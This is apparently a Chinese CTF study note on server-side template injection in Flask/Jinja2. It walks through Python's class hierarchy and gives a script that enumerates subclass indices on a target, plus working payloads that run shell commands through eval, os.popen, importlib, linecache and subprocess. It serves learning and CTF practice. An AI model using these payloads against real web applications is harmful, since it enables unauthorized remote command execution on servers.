---
title: ssti
description: ssti笔记
tags:
  - CTF
  - WEB
categories:
  - 笔记
cover: 'https://tuchuang.voooe.cn/images/2024/05/05/_202405052101082.jpg'
abbrlink: ssti注入[5]
date: 2024-05-15 22:40:00
---

## ssti漏洞成因
ssti服务端模板注入，ssti主要为python的一些框架 jinja2 mako tornado django，PHP框架smarty twig，java框架jade velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。本文主要对ctf中的flask模板注入进行分析。

## 常用python魔术方法：


> __class__ 返回类型所属的对象
> 
> __base__ 返回该对象所继承的基类
> __mro__ 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
> __bases__  以元组形式返回类型对象的全部基类
>
>//以上三种都是用于寻找基类
>  
> __subclasses__ 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表
>  
> __init__ 类的初始化方法
>  
> __globals__ 对包含函数全局变量的字典的引用
>  
> __builtins__  builtins即是引用，Python程序一旦启动，它就会在程序员所写的代码没有运行之前就已经被加载到内存中了,而对于builtins却不用导入，它在任何模块都直接可见，所以可以直接调用引用的模块
> 

## 基础流程：
### 解题思路
变量->对象->基类->所有子类->通过 globals 来获取os,file等可以执行命令/读取文件的module
![](https://s2.loli.net/2024/05/14/X1w2jU7O3raZb5d.png)

### 判断注入点(变量)
假设为get参数name
?name={{7*7}} -> 49 则表示注入成功

### 带出对象
选择以下任一格式，用class带出其对象(类)
```
{{''.__class__}} -> <class 'str'>
{{().__class__}} -> <class 'tuple'>
{{[].__class__}} -> <class 'list'>
{{{}.__class__}} -> <class 'dict'>
...
```
> 以下用''作例子。

### 引出object(基类)
```
{{''.__class__.__base__}}
{{''.__class__.__mro__}}
{{''.__class__.__mro__[0]}}
{{''.__class__.__bases__}}
{{''.__class__.__bases__[0]}}
```
### 引出基类下的所有子类
利用subclasses寻找可以利用的子类
```
{{''.__class__.__base__.subclasses__()}}
```
一般情况下会得到许多子类，这时可以通过手工，脚本或工具定位子类的位置

### 遍历python环境中类的脚本：
```python
#get请求
import requests

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'
}
#http请求头，可以用抓包工具抓一份自己的。
for i in range(500):
    url = "http://xxx.xxx.xxx.xxx:xxxx/?get参数={{().__class__.__bases__[0].__subclasses__()["+str(i)+"]}}"

    res = requests.get(url=url,headers=headers)
    if 'FileLoader' in res.text: #以FileLoader为例
        print(i)

# 得到编号为79
```
```python
#post请求
import requests

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'
}
#http请求头，可以用抓包工具抓一份自己的。
for i in range(500):
    url = "http://xxx.xxx.xxx.xxx:xxxx/"
    postPara = {"post参数":"{{().__class__.__bases__[0].__subclasses__()["+str(i)+"]}}"}
    res = requests.post(url=url,headers=headers,data=postPara)
    if 'FileLoader' in res.text: #以FileLoader为例，查找其他命令时就用其他子类
        print(i)

# 得到编号为79
```
### 利用子类执行命令
> 可以用来执行命令的类有很多，其基本原理就是遍历含有eval函数即os模块的子类，利用这些子类中的eval函数即os模块执行命令。

#### eval函数执行命令
> 含有eval函数的类：
> warnings.catch_warnings
> WarningMessage
> codecs.IncrementalEncoder
> codecs.IncrementalDecoder
> codecs.StreamReaderWriter
> os._wrap_close
> reprlib.Repr
> weakref.finalize
> ...

payload:
```
{{''.__class__.__bases__[0].__subclasses__()[166].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}
```
#### popen函数执行命令
> Python的 os 模块中有system和popen这两个函数可用来执行命令。其中system()函数执行命令是没有回显的。
> 我们可以使用system()函数配合curl外带数据；popen()函数执行命令有回显。
> 所以比较常用的函数为popen()函数，而当popen()函数被过滤掉时，可以使用system()函数代替。

我们可以通过os模块的**os._wrap_close**类引出popen来执行命令
```
{{''.__class__.__bases__[0].__subclasses__()[79].__init__.__globals__['os'].popen('ls /').read()}}
```
也可以直接使用popen来执行命令
```
{{''.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__['popen']('ls /').read()}}
```
#### importlib类执行命令
> python有一个importlib类，可用load_module来导入你需要的模块。
> 而**frozen_importlib.BuiltinImporter**类就可以提供 Python 中 import 语句的实现（以及 __import__ 函数）。我么可以直接利用该类中的load_module将os模块导入，从而使用 os 模块执行命令。

payload:
```
{{[].__class__.__base__.__subclasses__()[69]["load_module"]("os")["popen"]("ls /").read()}}
```
#### linecache 函数执行命令
> linecache 这个函数可用于读取任意一个文件的某一行，而这个函数中也引入了 os 模块.
> 所以我们也可以利用这个 linecache 函数去执行命令。

payload:
```
{{[].__class__.__base__.__subclasses__()[168].__init__.__globals__.linecache.os.popen('ls /').read()}}
{{[].__class__.__base__.__subclasses__()[168].__init__.__globals__['linecache']['os'].popen('ls /').read()}}
```
#### subprocess.Popen 类执行命令
从python2.4版本开始，可以用 subprocess 这个模块来产生子进程，并连接到子进程的标准输入/输出/错误中去，还可以得到子进程的返回值。

subprocess 意在替代其他几个老的模块或者函数，比如：os.system、os.popen 等函数。

payload: 
```
{{[].__class__.__base__.__subclasses__()[245]('ls /',shell=True,stdout=-1).communicate()[0].strip()}}  
```
## 未完待续

参考:
[flask SSTI学习与总结](https://forum.butian.net/share/1371)
[SSTI服务端模板注入](https://www.bilibili.com/video/BV1sc411979h)
[flask之ssti模版注入从零到入门](https://xz.aliyun.com/t/3679?time__1311=n4%2BxnD0DBDgDc7D9DUO4BqOoT47KaW4WemD#toc-8)